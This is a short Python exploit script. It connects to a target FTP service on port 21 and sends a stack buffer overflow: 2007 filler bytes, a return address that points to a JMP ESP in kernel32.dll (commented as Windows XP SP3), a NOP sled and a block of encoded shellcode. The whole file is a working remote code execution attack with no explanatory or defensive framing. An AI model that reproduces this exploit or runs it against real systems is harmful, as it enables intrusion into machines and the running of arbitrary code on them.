#!/usr/bin/env python

import socket
import sys

def connect():
	global s
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((sys.argv[1], 21))
	s.recv(1024)

def offset():
	junk = 2007 * "\x41"
	eip = "\x7B\x46\x86\x7C" #7C86467B JMP ESP in kernel32.dll in Win XP SP3
	nop = 20 * "\x90"
	shellcode = ("\xbe\xab\x25\xb0\xa0\xdb\xc7\xd9\x74\x24\xf4\x5a\x2b\xc9"
"\xb1\x52\x31\x72\x12\x83\xc2\x04\x03\xd9\x2b\x52\x55\xe1"
"\xdc\x10\x96\x19\x1d\x75\x1e\xfc\x2c\xb5\x44\x75\x1e\x05"
"\x0e\xdb\x93\xee\x42\xcf\x20\x82\x4a\xe0\x81\x29\xad\xcf"
"\x12\x01\x8d\x4e\x91\x58\xc2\xb0\xa8\x92\x17\xb1\xed\xcf"
"\xda\xe3\xa6\x84\x49\x13\xc2\xd1\x51\x98\x98\xf4\xd1\x7d"
"\x68\xf6\xf0\xd0\xe2\xa1\xd2\xd3\x27\xda\x5a\xcb\x24\xe7"
"\x15\x60\x9e\x93\xa7\xa0\xee\x5c\x0b\x8d\xde\xae\x55\xca"
"\xd9\x50\x20\x22\x1a\xec\x33\xf1\x60\x2a\xb1\xe1\xc3\xb9"
"\x61\xcd\xf2\x6e\xf7\x86\xf9\xdb\x73\xc0\x1d\xdd\x50\x7b"
"\x19\x56\x57\xab\xab\x2c\x7c\x6f\xf7\xf7\x1d\x36\x5d\x59"
"\x21\x28\x3e\x06\x87\x23\xd3\x53\xba\x6e\xbc\x90\xf7\x90"
"\x3c\xbf\x80\xe3\x0e\x60\x3b\x6b\x23\xe9\xe5\x6c\x44\xc0"
"\x52\xe2\xbb\xeb\xa2\x2b\x78\xbf\xf2\x43\xa9\xc0\x98\x93"
"\x56\x15\x0e\xc3\xf8\xc6\xef\xb3\xb8\xb6\x87\xd9\x36\xe8"
"\xb8\xe2\x9c\x81\x53\x19\x77\x6e\x0b\x20\xe3\x06\x4e\x22"
"\xf1\xdc\xc7\xc4\x6f\xf1\x81\x5f\x18\x68\x88\x2b\xb9\x75"
"\x06\x56\xf9\xfe\xa5\xa7\xb4\xf6\xc0\xbb\x21\xf7\x9e\xe1"
"\xe4\x08\x35\x8d\x6b\x9a\xd2\x4d\xe5\x87\x4c\x1a\xa2\x76"
"\x85\xce\x5e\x20\x3f\xec\xa2\xb4\x78\xb4\x78\x05\x86\x35"
"\x0c\x31\xac\x25\xc8\xba\xe8\x11\x84\xec\xa6\xcf\x62\x47"
"\x09\xb9\x3c\x34\xc3\x2d\xb8\x76\xd4\x2b\xc5\x52\xa2\xd3"
"\x74\x0b\xf3\xec\xb9\xdb\xf3\x95\xa7\x7b\xfb\x4c\x6c\x8b"
"\xb6\xcc\xc5\x04\x1f\x85\x57\x49\xa0\x70\x9b\x74\x23\x70"
"\x64\x83\x3b\xf1\x61\xcf\xfb\xea\x1b\x40\x6e\x0c\x8f\x61"
"\xbb")
	exploit = junk + eip + nop + shellcode
	s.send(exploit)

def main():
	connect()
	offset()

main()

